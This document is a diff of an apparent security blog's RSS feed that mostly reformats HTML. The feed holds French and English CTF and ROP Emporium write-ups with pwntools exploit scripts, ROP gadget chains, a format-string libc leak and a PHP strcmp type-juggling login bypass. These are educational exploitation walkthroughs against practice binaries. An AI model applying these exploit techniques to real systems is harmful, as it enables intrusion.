@@ -1926,8 +2048,7 @@ We can determine which <code>play_?()</code> function was used by playing the mu
 <p>Vous l&rsquo;avez peut-être remarqué, mais le dernier <code>mov</code> est un <code>mov edi, r13d</code> et non pas un <code>mov rdi, r13</code>, on devra donc re-modifier la valeur de <code>rdi</code> après ceci mais ce n&rsquo;est pas un problème puisque nous avons un <code>pop rdi ; ret</code> pour le faire.</p>
 <p>Commençons notre exploit avec tout d&rsquo;abord le padding et la première partie:</p>
 <blockquote>
-<p>Je n&rsquo;explique pas comment trouver les adresses utilisées puisque je pars du principe que vous avez vu les précédents writeups et que vous savez le faire, si ce n&rsquo;est pas le cas vous pouvez allez voir les premiers exercices</p>
-</blockquote>
+<p>Je n&rsquo;explique pas comment trouver les adresses utilisées puisque je pars du principe que vous avez vu les précédents writeups et que vous savez le faire, si ce n&rsquo;est pas le cas vous pouvez allez voir les premiers exercices</p></blockquote>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
@@ -2064,7 +2185,7 @@ We can determine which <code>play_?()</code> function was used by playing the mu
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
 </span></span><span style="display:flex;"><span>    main()
 </span></span></code></pre></div><p>On peut vérifier qu&rsquo;il fonctionne:</p>
-<p><img alt="2023-03-12-233951_1013x653_scrot" src="https://user-images.githubusercontent.com/77807503/224578372-184e1e8a-1472-4ebd-91a1-48255bf7fef2.png"></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/224578372-184e1e8a-1472-4ebd-91a1-48255bf7fef2.png" alt="2023-03-12-233951_1013x653_scrot"></p>
 <p>GG !</p>
 ]]></content>
         </item>
@@ -2144,8 +2265,7 @@ We can determine which <code>play_?()</code> function was used by playing the mu
 </span></span></code></pre></div><p>This shows that the program is vulnerable to <em>format string exploit</em>. So we will be able to leak addresses from the <code>stack</code> and eventually modify some <code>entries</code>.</p>
 <p>If we start thinking about our exploit here, we quickly see we&rsquo;re going to be stuck&hellip; There is no win function so we have to <em>make</em> our way to a shell, but to do that we would need to have a leak of the <code>libc</code>&hellip; That&rsquo;s not a problem since we know there is a <em>format string vulnerability</em>, but the main function doesn&rsquo;t loop so we only have one input to leak <code>libc</code> and overwrite a <code>libc</code> entry&hellip; this is impossible</p>
 <blockquote>
-<p>I struggled <strong>a lot</strong> on this step, I couldn&rsquo;t figure out how to loop main somehow&hellip; And I ended up seeing something interesting</p>
-</blockquote>
+<p>I struggled <strong>a lot</strong> on this step, I couldn&rsquo;t figure out how to loop main somehow&hellip; And I ended up seeing something interesting</p></blockquote>
 <p>By taking a look at the <code>main</code> function in the <em>executable</em> (and not the <code>.c</code> file) by disassembling it, we see that the last <code>printf</code> was replaced by a <code>puts</code> (probably by the compiler)</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> disass main 
 </span></span><span style="display:flex;"><span>Dump of assembler code <span style="color:#66d9ef">for</span> function main:
@@ -2263,8 +2383,7 @@ We can determine which <code>play_?()</code> function was used by playing the mu
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> x<span style="color:#f92672">/</span>x <span style="color:#ae81ff">0x7ffff7da3d90</span>
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x7ffff7da3d90</span> <span style="color:#f92672">&lt;</span>__libc_start_call_main<span style="color:#f92672">+</span><span style="color:#ae81ff">128</span><span style="color:#f92672">&gt;</span>:	<span style="color:#ae81ff">0x89</span>
 </span></span></code></pre></div><blockquote>
-<p>After realising that the <em>remote</em> address at position 39 looks something like <code>0x40xxxx</code>, I poked around and tried to find where the libc address was. This usually happens because the stack layout is not the same locally and remotely and sometimes the position is a bit different</p>
-</blockquote>
+<p>After realising that the <em>remote</em> address at position 39 looks something like <code>0x40xxxx</code>, I poked around and tried to find where the libc address was. This usually happens because the stack layout is not the same locally and remotely and sometimes the position is a bit different</p></blockquote>
 <p>We can complete our exploit with the leak:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
 </span></span><span style="display:flex;"><span>
@@ -2343,8 +2462,7 @@ We can determine which <code>play_?()</code> function was used by playing the mu
 </span></span><span style="display:flex;"><span>  [rdx] <span style="color:#f92672">==</span> NULL <span style="color:#f92672">||</span> rdx <span style="color:#f92672">==</span> NULL
 </span></span></code></pre></div><p>Let&rsquo;s try them one by one until we find one that works</p>
 <blockquote>
-<p>I had to re-do the <code>AAAA %p %p %p</code> trick because the input had moved from <code>6th</code> to <code>8th</code> position</p>
-</blockquote>
+<p>I had to re-do the <code>AAAA %p %p %p</code> trick because the input had moved from <code>6th</code> to <code>8th</code> position</p></blockquote>
 <p>After testing them one by one, I figured the last one works.</p>
 <h2 id="final-payload">Final Payload</h2>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
@@ -2422,7 +2540,7 @@ We can determine which <code>play_?()</code> function was used by playing the mu
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
 </span></span><span style="display:flex;"><span>    main()
 </span></span></code></pre></div><p>We can make sure that it works:</p>
-<p><img alt="2023-02-23-183836_1888x1030_scrot" src="https://user-images.githubusercontent.com/77807503/220987066-220419b3-d8c3-4fd2-97e5-745f98a78f1f.png"></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/220987066-220419b3-d8c3-4fd2-97e5-745f98a78f1f.png" alt="2023-02-23-183836_1888x1030_scrot"></p>
 <p>And it does, gg!</p>
 <p><em>flag -&gt; lactf{printf_gave_me_up_and_let_me_down}</em></p>
 ]]></content>
@@ -2642,7 +2760,7 @@ We can determine which <code>play_?()</code> function was used by playing the mu
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
 </span></span><span style="display:flex;"><span>    main()
 </span></span></code></pre></div><p>Now, we can test it locally and remotely to check it works fine:</p>
-<p><img alt="2023-02-16-114129_1161x653_scrot" src="https://user-images.githubusercontent.com/77807503/220722169-62441fde-b37d-439e-bfd6-5b3d48593ab6.png"></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/220722169-62441fde-b37d-439e-bfd6-5b3d48593ab6.png" alt="2023-02-16-114129_1161x653_scrot"></p>
 <p>and it does! gg!</p>
 <p><em>flag -&gt; lactf{hey_stop_bullying_my_bot_thats_not_nice}</em></p>
 ]]></content>
@@ -2810,12 +2928,11 @@ We can determine which <code>play_?()</code> function was used by playing the mu
 </span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
 </span></span></span></code></pre></div><p>When comparing the two values, PHP will turn 123456789.0000000000 into an integer because it has no decimal value. The condition will then return <code>True</code>, which is mathematically correct but could allow an attacker to bypass length restrictions</p>
 <p>Here is a table that shows the different results when a <strong>loose comparison</strong> (when PHP uses type juggling) occurs in <strong>PHP 7.X</strong></p>
-<p><img alt="Pasted image 20230107010517" src="https://user-images.githubusercontent.com/77807503/211122304-a2f5f310-ddbb-4b71-b8e2-63d9406de2d9.png"></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/211122304-a2f5f310-ddbb-4b71-b8e2-63d9406de2d9.png" alt="Pasted image 20230107010517"></p>
 <h1 id="better-example">Better example</h1>
 <p>I will use a &ldquo;PHP Type juggling&rdquo; challenge I made as an example for this part.</p>
 <blockquote>
-<p>I will try to explain the code as much as I can, so don&rsquo;t worry if you&rsquo;re not comfortable with PHP.</p>
-</blockquote>
+<p>I will try to explain the code as much as I can, so don&rsquo;t worry if you&rsquo;re not comfortable with PHP.</p></blockquote>
 <p>Here is the backend of a login page:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
 </span></span><span style="display:flex;"><span>
@@ -2846,8 +2963,7 @@ We can determine which <code>play_?()</code> function was used by playing the mu
 </span></span></span></code></pre></div><p>First, we make sure that the two POST parameters (used to pass the username and the password) are not empty. This line is not vulnerable.</p>
 <p>The vulnerability is in the next condition, the one that checks the password. The <strong>strcmp</strong> function is used to compare a randomly generated password with the user&rsquo;s input.</p>
 <blockquote>
-<p>We compare the input with a randomly generated password because the goal of this challenge is not to figure out what the password is but rather to bypass the condition</p>
-</blockquote>
+<p>We compare the input with a randomly generated password because the goal of this challenge is not to figure out what the password is but rather to bypass the condition</p></blockquote>
 <p>The <strong>strcmp</strong> function compares two strings and returns <code>0</code> if they are equal. To know if they are, we have to check if the function returned <code>0</code> or not.</p>
 <p>What we can see is that this verification is made using a <strong>loose comparison</strong> (only two = were used)</p>
 <p>And you should know that <strong>strcmp</strong> returns <code>NULL</code> if one of the two passed arguments is not a string. Knowing that, we just have to enter something else than a string for the password, and the function will return <code>NULL</code></p>
@@ -2911,7 +3027,7 @@ You&#39;ll still need to deal with writing a string into memory, similar to the 
 </span></span></code></pre></div><p>Comme pour le précédent, <strong>NX</strong> est activé donc pas de shellcode, mais ce n&rsquo;est pas un problème puisque la description de l&rsquo;exercice nous indique exactement quoi faire</p>
 <h2 id="exploitation">Exploitation</h2>
 <p>On va le lancer pour voir ce qu&rsquo;il fait concrètement:</p>
-<p><img alt="2023-01-29-174453_1698x557_scrot" src="https://user-images.githubusercontent.com/77807503/215351090-d424b61d-309b-4fc7-94b5-2c42cb11dfd3.png"></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/215351090-d424b61d-309b-4fc7-94b5-2c42cb11dfd3.png" alt="2023-01-29-174453_1698x557_scrot"></p>
 <p>On voit que si on entre un nombre élevé de bytes dans l&rsquo;input le programme plante (<code>segfault</code>), ce qui veut dire qu&rsquo;on a commencé à overwrite des registres.</p>
 <p>Je vais passer assez vite sur la première partie de l&rsquo;exploit puisque c&rsquo;est la même chose que l&rsquo;<a href="/posts/2023/01/ropemporium-badchars-x64/#write4">exo précédent</a></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> disass pwnme
@@ -3052,8 +3168,7 @@ You&#39;ll still need to deal with writing a string into memory, similar to the 
 <h1 id="final-payload">Final Payload</h1>
 <p>Voici donc notre payload:</p>
 <blockquote>
-<p>Note: j&rsquo;ai dû ajouter 8 à l&rsquo;adresse de <code>.data</code> puisque sinon il y avait un badchar dans l&rsquo;adresse elle même et elle se faisait filtrer</p>
-</blockquote>
+<p>Note: j&rsquo;ai dû ajouter 8 à l&rsquo;adresse de <code>.data</code> puisque sinon il y avait un badchar dans l&rsquo;adresse elle même et elle se faisait filtrer</p></blockquote>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
@@ -3125,7 +3240,7 @@ You&#39;ll still need to deal with writing a string into memory, similar to the 
 </span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
 </span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Flag:&#34;</span>,p<span style="color:#f92672">.</span>recvall()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>))
 </span></span></code></pre></div><p>On peut tester le payload pour s&rsquo;assurer qu&rsquo;il fonctionne:</p>
-<p><img alt="2023-01-29-202357_1179x660_scrot" src="https://user-images.githubusercontent.com/77807503/215351100-c463126a-5839-44ef-a4c8-a94397eca44c.png"></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/215351100-c463126a-5839-44ef-a4c8-a94397eca44c.png" alt="2023-01-29-202357_1179x660_scrot"></p>
 <p>Et il fonctionne ! gg !</p>
 ]]></content>
         </item>
@@ -3176,7 +3291,7 @@ A PLT entry for a function named print_file() exists within the challenge binary
 </span></span></code></pre></div><p>Comme pour le précédent, <strong>NX</strong> est activé donc pas de shellcode, mais ce n&rsquo;est pas un problème puisque la description de l&rsquo;exercice nous indique exactement quoi faire</p>
 <h2 id="exploitation">Exploitation</h2>
 <p>On va le lancer pour voir ce qu&rsquo;il fait concrètement:</p>
-<p><img alt="2023-01-21-151701_1046x476_scrot" src="https://user-images.githubusercontent.com/77807503/213875956-5f7e3f8e-3d1e-42a1-b4f6-53168ef66fb4.png"></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/213875956-5f7e3f8e-3d1e-42a1-b4f6-53168ef66fb4.png" alt="2023-01-21-151701_1046x476_scrot"></p>
 <p>On voit que si on entre un nombre élevé de bytes dans l&rsquo;input le programme plante (<code>segfault</code>), ce qui veut dire qu&rsquo;on a commencé à overwrite des registres.</p>
 <p>Cette fois pas besoin de désassembler les fonctions puisqu&rsquo;on sait exactement ce qu&rsquo;il faut faire, on peut commencer à ressembler les élements nécessaires pour construire notre payload.</p>
 <p>Commençons par regarder les sections de l&rsquo;executable pour en trouver une dans laquelle on va pouvoir écrire:</p>
@@ -3223,20 +3338,17 @@ A PLT entry for a function named print_file() exists within the challenge binary
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400601</span> : mov rbp, rsp ; pop rbp ; jmp <span style="color:#ae81ff">0x400590</span>
 </span></span></code></pre></div><p>On voit un <code>mov qword ptr [r14], r15 ; ret</code> à l&rsquo;adresse <code>0x00400628</code>, encore une fois exactement ce qu&rsquo;il nous faut.</p>
 <blockquote>
-<p>L&rsquo;instruction <code>mov</code> déplace le cotenu du second registre dans le premier, en l&rsquo;occurence ici, il déplace la valeur de r15 dans l&rsquo;adresse dans r14 (grâce au <code>qword ptr</code>)</p>
-</blockquote>
+<p>L&rsquo;instruction <code>mov</code> déplace le cotenu du second registre dans le premier, en l&rsquo;occurence ici, il déplace la valeur de r15 dans l&rsquo;adresse dans r14 (grâce au <code>qword ptr</code>)</p></blockquote>
 <p>Mais il nous manque encore un gadget! Si on regarde attentivement la description du challenge, on voit qu&rsquo;il existe un fonction <code>print_file()</code> qui prend en argument le nom d&rsquo;un fichier. Le string qu&rsquo;on va écrire dans <code>.data</code> va donc être <code>flag.txt</code> et plus <code>&quot;/bin/cat flag.txt&quot;</code>.</p>
 <blockquote>
 <p>Rappel: En 64bit, les fonctions prennent leurs arguments dans les registres <code>rdi</code>, <code>rsi</code>, <code>rdx</code>, <code>rcx</code>&hellip; (vous pouvez trouver la liste des registres <a href="https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/linux-x64-calling-convention-stack-frame">ici</a>).
-Donc, en modifiant <code>rdi</code> et en plaçant l&rsquo;adresse de <code>.data</code> dedans, la fonction <code>print_file()</code> prendra notre string en premier argument</p>
-</blockquote>
+Donc, en modifiant <code>rdi</code> et en plaçant l&rsquo;adresse de <code>.data</code> dedans, la fonction <code>print_file()</code> prendra notre string en premier argument</p></blockquote>
 <p>Nous avons donc besoin d&rsquo;un <code>pop rdi</code> !</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>ROPgadget <span style="color:#f92672">--</span>binary write4 <span style="color:#f92672">|</span> grep <span style="color:#e6db74">&#34;pop rdi ; ret&#34;</span>
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400693</span> : pop rdi ; ret 
 </span></span></code></pre></div><p>Parfait, il nous faut maintenant deux dernières choses: l&rsquo;adresse de la fonction <code>print_file()</code> et le padding nécessaire pour réecrire la sauvegarde de <code>rip</code>.</p>
 <blockquote>
-<p>Puisque PIE n&rsquo;est pas activé, on peut trouver statiquement l&rsquo;adresse de <code>print_file</code>, si il était activé, nous aurions dû le contourner, par exemple en trouvant la base address de l&rsquo;executable</p>
-</blockquote>
+<p>Puisque PIE n&rsquo;est pas activé, on peut trouver statiquement l&rsquo;adresse de <code>print_file</code>, si il était activé, nous aurions dû le contourner, par exemple en trouvant la base address de l&rsquo;executable</p></blockquote>
 <p>Commençons par trouver l&rsquo;adresse de <code>print_file()</code> avec <code>pwndbg</code>:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> info functions
 </span></span><span style="display:flex;"><span>All defined functions:
@@ -3297,8 +3409,7 @@ Donc, en modifiant <code>rdi</code> et en plaçant l&rsquo;adresse de <code>.dat
 </span></span><span style="display:flex;"><span>End of assembler dump<span style="color:#f92672">.</span>
 </span></span></code></pre></div><blockquote>
 <p>J&rsquo;ai désassemblé la fonction en débuggant l&rsquo;executable puisqu&rsquo;elle était vide tant que le programme n&rsquo;était pas lancé
-Pour reproduire ceci, mettez un breakpoint au début de la fonction puis avancez dans l&rsquo;éxecution jusqu&rsquo;au <code>read</code>, puis désassemblez <code>pwnme</code></p>
-</blockquote>
+Pour reproduire ceci, mettez un breakpoint au début de la fonction puis avancez dans l&rsquo;éxecution jusqu&rsquo;au <code>read</code>, puis désassemblez <code>pwnme</code></p></blockquote>
 <p>On voit que le buffer est situé à <code>rbp-0x20</code> et que la fonction <code>read</code> va lire <code>0x200</code> bytes d&rsquo;input, ce qui est largement assez. Pour réecrire la sauvegarde de <code>rip</code>, il nous faut <code>0x8</code> bytes de plus que le buffer, donc notre padding total sera de <code>(0x20+0x8)</code> bytes.</p>
 <p>Puisque je suis toujours sous Ubuntu, on peut s&rsquo;attendre à des problèmes de stack alignment donc je vais ajouter un <code>ret</code> juste après mon padding</p>
 <h2 id="final-payload">Final Payload</h2>
@@ -3342,7 +3453,7 @@ Pour reproduire ceci, mettez un breakpoint au début de la fonction puis avancez
 </span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
 </span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Flag:&#34;</span>,p<span style="color:#f92672">.</span>recvall()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>))
 </span></span></code></pre></div><p>Puis on peut le tester pour s&rsquo;assurer qu&rsquo;il fonctionne:</p>
-<p><img alt="2023-01-21-160402_1111x283_scrot" src="https://user-images.githubusercontent.com/77807503/213875961-819be98f-e699-4a60-8fe7-45caa64e25ac.png"></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/213875961-819be98f-e699-4a60-8fe7-45caa64e25ac.png" alt="2023-01-21-160402_1111x283_scrot"></p>
 <p>Parfait, on a le flag!</p>
 ]]></content>
         </item>
@@ -3386,7 +3497,7 @@ e.g. callme_one(0xdeadbeef, 0xcafebabe, 0xd00df00d) to print the flag.
 
 For the x86_64 binary double up those values, e.g. callme_one(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)
 </code></pre><p>On peut quand même le lancer et voir ce qu&rsquo;il fait:</p>
-<p><img alt="2023-01-15-150610_1072x508_scrot" src="https://user-images.githubusercontent.com/77807503/212548895-0fd03e37-d707-47da-ae38-d1789011bca0.png"></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/212548895-0fd03e37-d707-47da-ae38-d1789011bca0.png" alt="2023-01-15-150610_1072x508_scrot"></p>
 <p>Comme pour le précédent, on voit qu&rsquo;on peut overflow le buffer en envoyant un nombre conséquent de bytes. Désassemblons le <code>main</code> pour voir plus clairement ce qu&rsquo;il se passe:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> disass main
 </span></span><span style="display:flex;"><span>Dump of assembler code <span style="color:#66d9ef">for</span> function main:
@@ -3529,7 +3640,7 @@ For the x86_64 binary double up those values, e.g. callme_one(0xdeadbeefdeadbeef
 </span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
 </span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recvall())
 </span></span></code></pre></div><p>Testons le pour s&rsquo;assurer qu&rsquo;il fonctionne:</p>
-<p><img alt="2023-01-15-152741_1107x131_scrot" src="https://user-images.githubusercontent.com/77807503/212548940-3656b68e-932b-4e5b-ab2f-d04687f65fdb.png"></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/212548940-3656b68e-932b-4e5b-ab2f-d04687f65fdb.png" alt="2023-01-15-152741_1107x131_scrot"></p>
 <p>Et on voit que le programme a <code>segfault</code>&hellip; Pour rappel je suis sous <strong>Ubuntu 22.04</strong> donc mon système est affecté par les problèmes de <em>stack alignment</em>. On va donc ajouter un ret juste après notre padding, qu&rsquo;on peut trouver avec ROPgadget</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>ROPgadget <span style="color:#f92672">--</span>binary callme
 </span></span><span style="display:flex;"><span>
@@ -3588,11 +3699,10 @@ For the x86_64 binary double up those values, e.g. callme_one(0xdeadbeefdeadbeef
 </span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
 </span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Flag:&#34;</span>,p<span style="color:#f92672">.</span>recvall()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)[<span style="color:#ae81ff">3</span>]<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>))
 </span></span></code></pre></div><p>Et cette fois, il devrait fonctionner:</p>
-<p><img alt="2023-01-15-153142_994x552_scrot" src="https://user-images.githubusercontent.com/77807503/212548977-7d83ef59-bf5a-497e-b655-9011e98b84d5.png"></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/212548977-7d83ef59-bf5a-497e-b655-9011e98b84d5.png" alt="2023-01-15-153142_994x552_scrot"></p>
 <p>Parfait, on a réussi à récupérer le flag</p>
 <blockquote>
-<p>Note: Nous ne sommes pas en x86_x64 donc nous n&rsquo;aurions pas dû avoir besoin de doubler les valeurs des arguments comme dit dans la consigne mais ça ne fonctionnait pas sans&hellip;</p>
-</blockquote>
+<p>Note: Nous ne sommes pas en x86_x64 donc nous n&rsquo;aurions pas dû avoir besoin de doubler les valeurs des arguments comme dit dans la consigne mais ça ne fonctionnait pas sans&hellip;</p></blockquote>
 ]]></content>
         </item>
         
@@ -3626,7 +3736,7 @@ For the x86_64 binary double up those values, e.g. callme_one(0xdeadbeefdeadbeef
 </span></span></code></pre></div><p>Cette fois-ci, <strong>NX</strong> est activé, ce qui veut dire qu&rsquo;on ne pourra pas utiliser de shellcode.</p>
 <h2 id="exploitation">Exploitation</h2>
 <p>On va run l&rsquo;executable et voir ce qu&rsquo;il se passe</p>
-<p><img alt="2023-01-14-140834_657x666_scrot" src="https://user-images.githubusercontent.com/77807503/212481259-21f15103-f1f5-4ce5-a4e6-5a89b7f34acf.png"></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/212481259-21f15103-f1f5-4ce5-a4e6-5a89b7f34acf.png" alt="2023-01-14-140834_657x666_scrot"></p>
 <p>Contrairement au précédent, il ne nous donne aucune information sur son fonctionnement. En revanche, on voit que si on entre un nombre de bytes élevé dans l&rsquo;input, il  <code>segfault</code>, ce qui veut dire qu&rsquo;on a commencé à réecrire la sauvegarde de <code>rip</code></p>
 <p>C&rsquo;est bon signe, on a déjà trouvé notre point d&rsquo;entrée. On va maintenant désassembler l&rsquo;executable avec <code>pwndbg</code> pour essayer de comprendre plus en détail ce qu&rsquo;il fait</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> disass main
@@ -3842,8 +3952,7 @@ For the x86_64 binary double up those values, e.g. callme_one(0xdeadbeefdeadbeef
 </span></span></code></pre></div><p>Parfait, c&rsquo;est bien l&rsquo;adresse de notre <code>/bin/cat flag.txt</code>.</p>
 <p>Il nous manque à présent une dernière chose: un gadget <code>pop rdi; ret</code>.</p>
 <blockquote>
-<p>Dans les architectures x64, les arguments des fonctions passent par des <strong>registres</strong>. Par exemple, quand la fonction <code>system</code> va être appelée, elle va aller chercher son premier argument dans le registre <code>rdi</code>.</p>
-</blockquote>
+<p>Dans les architectures x64, les arguments des fonctions passent par des <strong>registres</strong>. Par exemple, quand la fonction <code>system</code> va être appelée, elle va aller chercher son premier argument dans le registre <code>rdi</code>.</p></blockquote>
 <p>Pour trouver ce gadget, on peut utiliser <code>ROPGadget</code>:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>ROPgadget <span style="color:#f92672">--</span>binary split <span style="color:#f92672">|</span> grep <span style="color:#e6db74">&#34;pop rdi&#34;</span>
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004007c3</span> : pop rdi ; ret
@@ -3854,8 +3963,7 @@ For the x86_64 binary double up those values, e.g. callme_one(0xdeadbeefdeadbeef
 <li>On peut appeller la fonction <code>system</code> depuis son adresse puisque la protection <code>PIE</code> n&rsquo;est pas activée</li>
 </ul>
 <blockquote>
-<p>Si PIE avait été activé, nous n&rsquo;aurions pas pu prendre l&rsquo;adresse de la fonction <code>system</code> puisqu&rsquo;elle aurait changé entre chaque exécution</p>
-</blockquote>
+<p>Si PIE avait été activé, nous n&rsquo;aurions pas pu prendre l&rsquo;adresse de la fonction <code>system</code> puisqu&rsquo;elle aurait changé entre chaque exécution</p></blockquote>
 <h2 id="final-payload">Final Payload</h2>
 <p>Complétons notre exploit</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
@@ -3877,7 +3985,7 @@ For the x86_64 binary double up those values, e.g. callme_one(0xdeadbeefdeadbeef
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Flag:&#34;</span>,p<span style="color:#f92672">.</span>recvall()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>))
 </span></span></code></pre></div><p>Et maintenant, on le lance:</p>
-<p><img alt="2023-01-14-155456_1115x137_scrot" src="https://user-images.githubusercontent.com/77807503/212481792-479ec049-ac21-4fc7-b527-da64381c21ef.png"></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/212481792-479ec049-ac21-4fc7-b527-da64381c21ef.png" alt="2023-01-14-155456_1115x137_scrot"></p>
 <p>On a notre flag, gg !</p>
 ]]></content>
         </item>
@@ -3910,7 +4018,7 @@ For the x86_64 binary double up those values, e.g. callme_one(0xdeadbeefdeadbeef
 </span></span><span style="display:flex;"><span>    <span style="color:#f92672">PIE</span><span style="color:#f92672">:</span>      <span style="color:#f92672">No</span> <span style="color:#f92672">PIE</span> <span style="color:#f92672">(</span><span style="color:#f92672">0x400000</span><span style="color:#f92672">)</span>
 </span></span></code></pre></div><h2 id="exploitation">Exploitation</h2>
 <p>On va le run et voir ce qu&rsquo;il se passe</p>
